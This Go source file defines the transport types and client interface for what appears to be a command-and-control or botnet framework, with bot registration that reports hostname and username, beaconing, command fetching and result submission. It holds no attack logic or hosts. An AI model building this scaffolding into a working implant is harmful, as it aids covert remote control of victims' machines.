package transport

import "context"

type RegisterRequest struct {
	Hostname     string `json:"hostname"`
	OS           string `json:"os"`
	Architecture string `json:"architecture"`
	Username     string `json:"username"`
}

type RegisterResponse struct {
	ID           string `json:"id"`
	SessionToken string `json:"session_token"`
}

type BeaconRequest struct {
	BotID string `json:"bot_id"`
	Mode  string `json:"mode,omitempty"`
}

type BeaconResponse struct {
	Status          string `json:"status"`
	PendingCommands int    `json:"pending_commands"`
}

type Command struct {
	ID      string `json:"id"`
	Type    string `json:"type"`
	Payload string `json:"payload"`
	Timeout int    `json:"timeout,omitempty"`
}

type CommandResult struct {
	CommandID string `json:"command_id"`
	Output    string `json:"output"`
	Status    string `json:"status"`
}

type Client interface {
	Register(ctx context.Context, req RegisterRequest) (RegisterResponse, error)
	Beacon(ctx context.Context, req BeaconRequest) (BeaconResponse, error)
	GetCommands(ctx context.Context) ([]Command, error)
	SubmitResult(ctx context.Context, result CommandResult) error
}
